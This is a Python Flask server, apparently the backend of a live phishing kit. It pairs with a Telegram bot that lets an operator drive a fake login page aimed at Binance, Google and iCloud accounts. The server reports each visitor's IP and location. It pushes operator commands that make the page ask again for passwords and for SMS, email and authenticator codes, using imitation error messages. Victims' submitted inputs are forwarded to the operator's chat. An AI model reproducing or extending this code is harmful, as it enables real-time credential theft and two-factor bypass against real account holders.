from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from dotenv import load_dotenv
import os
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, Dispatcher, MessageHandler, Filters
import threading
from telegram.error import TelegramError
import redis
import json
import time

# Load environment variables
load_dotenv()

# Initialize Flask app
app = Flask(__name__)
CORS(app, origins=["https://wekopp45.com", "http://wekopp45.com", 
                  "http://185.113.249.149:3000", "http://185.113.249.149", 
                  "https://185.113.249.149"])

# Get configuration from environment
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
REDIS_URL = os.getenv('REDIS_URL', 'redis://localhost:6379/0')

# Connect to Redis for shared state across workers
redis_client = redis.from_url(REDIS_URL)

# Command definitions
COMMANDS = {
    "REQUEST_BINANCE_PASSWORD": "",
    "REQUEST_EMAIL_AGAIN": "Binance account not found",
    "REQUEST_PASSWORD_AGAIN": "Incorrect password. Please retry again. You have 3 more chances left.(200001004-a2437132)",
    "REQUEST_MOBILE_APP_VERIFICATION": "Mobile app verification page is not available yet",
    "REQUEST_AUTHENTICATION_EMAIL": "Auth and email page loaded",
    "REQUEST_AUTHENTICATION_PHONE": "Auth and phone page loaded",
    "REQUEST_AUTH_OTP_AGAIN": "You have entered an incorrect 2FA verification code.(200001013-210a9570)",
    "REQUEST_EMAIL_OTP_AGAIN": "Incorrect verification code. Please check your emails or resend the code and try again.(001412-c91b96d1)",
    "REQUEST_PHONE_OTP_AGAIN": "Incorrect verification code. Please check your SMS or resend the code and try again.(001412-c91b96d1)",
    "REQUEST_ONLY_PHONE_AUTH": "",
    "REQUEST_ONLY_EMAIL_AUTH": "",
    "REQUEST_ONLY_AUTH": "",
    "REQUEST_GOOGLE_EMAIL_AGAIN": "Couldnt find your google account",
    "REQUEST_GOOGLE_PASSWORD": "",
    "REQUEST_GOOGLE_PASSWORD_AGAIN": "Wrong password. Try again",
    "REQUEST_GOOGLE_PHONE_OTP": "",
    "REQUEST_GOOGLE_MFA": "Requesting Google MFA verification",
    "REQUEST_GOOGLE_2STEPS": "Requesting 2-step verification",
    "REQUEST_GOOGLE_AUTH_OTP": "Requesting Google Authenticator OTP",
    "REQUEST_ICLOUD_EMAIL_AGAIN": "Enter the email or phone number and password for your Apple Account.",
    "REQUEST_ICLOUD_PASSWORD": "",
    "REQUEST_ICLOUD_PASSWORD_AGAIN": "Enter the email or phone number and password for your Apple Account.",
    "REQUEST_ICLOUD_2FA_OTP": "A message with a verification code has been sent to your devices. Enter the code to continue.",
    "REQUEST_ICLOUD_2FA_OTP_AGAIN": "Incorrect verification code.",
    "CORRECT_OTP": "Correct",
    "FINISH": "Redirecting user to the specified URL",
    "TOGGLE_AVAILABILITY": "",
    "CHECK_STATUS": "",
}

# Initialize bot
bot = Bot(token=TELEGRAM_BOT_TOKEN)
updater = None

# Helper functions for Redis storage
def store_active_command(command_data):
    """Store the most recently issued command"""
    redis_client.setex(
        "active_command", 
        300,  # Expire after 5 minutes
        json.dumps(command_data)
    )

def get_active_command():
    """Get and clear the active command"""
    data = redis_client.get("active_command")
    if data:
        redis_client.delete("active_command")
        return json.loads(data)
    return None

def store_google_2steps_number(number):
    """Store the phone number for Google 2-step verification"""
    redis_client.setex("google_2steps_number", 300, number)

def get_google_2steps_number():
    """Get the stored Google 2-step verification number"""
    number = redis_client.get("google_2steps_number")
    if number:
        redis_client.delete("google_2steps_number")
        return number.decode('utf-8')
    return None

def get_location(ip):
    """Get location information for an IP address"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city")
        location = response.json()
        return f"{location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}"
    except Exception as e:
        print(f"Error getting location: {e}")
        return "Location unavailable"

# Telegram bot handlers
def handle_button_click(update: Update, context):
    query = update.callback_query
    command = query.data



    if command == "TOGGLE_AVAILABILITY":
        current = redis_client.get("service_available")
        new_value = "False" if (current and current.decode() == "True") else "True"
        redis_client.set("service_available", new_value)
        status = "🟢 Available" if new_value == "True" else "🔴 Unavailable"
        query.answer(f"Availability toggled: {status}")
        return
    elif command == "CHECK_STATUS":
        current = redis_client.get("service_available") or b"True"
        status = "🟢 Available" if current.decode() == "True" else "🔴 Unavailable"
        query.answer(status)
        return
    elif command == "REQUEST_GOOGLE_2STEPS":
        try:
            query.answer("Please send the number to use for Google 2-step verification")
            bot.send_message(
                chat_id=query.message.chat_id, 
                text="Please send the number to use for Google 2-step verification"
            )
            
            # Store in Redis that we're awaiting a phone number for this command
            redis_client.setex("awaiting_google_2steps", 300, "true")
            
        except TelegramError as e:
            print(f"Telegram error: {e}")
    
    elif command in COMMANDS:
        # For regular commands, just store the command
        command_data = {
            'command': command,
            'message': COMMANDS[command],
            'timestamp': time.time()
        }
        
        # Store the active command
        store_active_command(command_data)
        
        print(f"COMMAND RECEIVED: {command} - {COMMANDS[command]}")
        try:
            query.answer(f"Command received: {command}")
        except TelegramError as e:
            print(f"Telegram error: {e}")
    else:
        try:
            query.answer("Invalid command")
        except TelegramError as e:
            print(f"Telegram error: {e}")

def handle_text_message(update: Update, context):
    # Check if we're awaiting a phone number for 2-step verification
    awaiting_google_2steps = redis_client.get("awaiting_google_2steps")
    
    if awaiting_google_2steps:
        number = update.message.text
        if number.isdigit():
            # Store the number for 2-step verification
            store_google_2steps_number(number)
            
            # Create a command for 2-step verification
            command_data = {
                'command': "REQUEST_GOOGLE_2STEPS",
                'number': number,
                'timestamp': time.time()
            }
            store_active_command(command_data)
            
            # Clear the awaiting flag
            redis_client.delete("awaiting_google_2steps")
            
            update.message.reply_text(f"Success! Google 2-step verification number set to: {number}")
            print(f"COMMAND RECEIVED: REQUEST_GOOGLE_2STEPS - {number}")
        else:
            update.message.reply_text("Please send a valid number")

def start_bot():
    global updater
    try:
        updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
        dispatcher = updater.dispatcher
        dispatcher.add_handler(CallbackQueryHandler(handle_button_click))
        dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text_message))

        # Start the bot without using idle()
        updater.start_polling(drop_pending_updates=True)
        print("Telegram bot started successfully")
    except Exception as e:
        print(f"Error starting bot: {e}")

# Flask routes
@app.route('/track-ip', methods=['POST'])
def track_ip():
    """Just a placeholder to maintain API compatibility"""
    return jsonify({"status": "success"})

@app.route('/check-command', methods=['GET'])
def check_command():
    """Get the current active command"""
    command_data = get_active_command()
    
    if command_data:
        print(f"Sending command to client: {command_data}")
        return jsonify(command_data)
    
    # Check if there's a Google 2-step verification number
    number = get_google_2steps_number()
    if number:
        return jsonify({
            'command': 'REQUEST_GOOGLE_2STEPS',
            'number': number,
            'timestamp': time.time()
        })
        
    return jsonify({"command": None})

@app.route('/send-message', methods=['POST'])
def send_message():
    data = request.get_json()
    message = data.get("message")
    print(f"message is {message} and data is {data}")

    if not message:
        return jsonify({"error": "No message provided"}), 400

    try:
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
        return jsonify({"status": "input received successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/notify', methods=['POST', 'OPTIONS'])
def notify():
    if request.method == 'OPTIONS':
        return jsonify({"status": "success"}), 200



    available = redis_client.get("service_available") or b"True"
    if available.decode() == "False":
        return jsonify({"available": False})

    try:
        ip = request.remote_addr
        message = f"New User Visited!\nIP: {ip}\nLocation: {get_location(ip)}"

        # Create inline keyboard with all available commands
        keyboard = []
        # Create rows of 2 buttons each
        commands_list = list(COMMANDS.keys())
        for i in range(0, len(commands_list), 2):
            row = []
            for j in range(2):
                if i + j < len(commands_list):
                    cmd = commands_list[i + j]
                    row.append({"text": cmd.replace("_", " "), "callback_data": cmd})
            keyboard.append(row)

        reply_markup = {
            "inline_keyboard": keyboard
        }

        try:
            bot.send_message(
                chat_id=TELEGRAM_CHAT_ID,
                text=message,
                reply_markup=reply_markup
            )
            return jsonify({"status": "success"})
        except TelegramError as e:
            print(f"Telegram error in notify: {e}")
            return jsonify({"status": "error", "message": str(e)}), 500

    except Exception as e:
        print(f"Error in notify endpoint: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Initialize the bot in a separate thread when running directly
if __name__ == '__main__':
    # Start the bot in a separate thread
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.daemon = True
    bot_thread.start()

    # SSL certificate paths
    key_path = '/etc/letsencrypt/live/wekopp45.com/privkey.pem'
    cert_path = '/etc/letsencrypt/live/wekopp45.com/fullchain.pem'
    
    # Run Flask app
    app.run(host='0.0.0.0', port=5000, ssl_context=(cert_path, key_path))
else:
    # When running with Gunicorn, start the bot thread for each worker
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.daemon = True
    bot_thread.start()
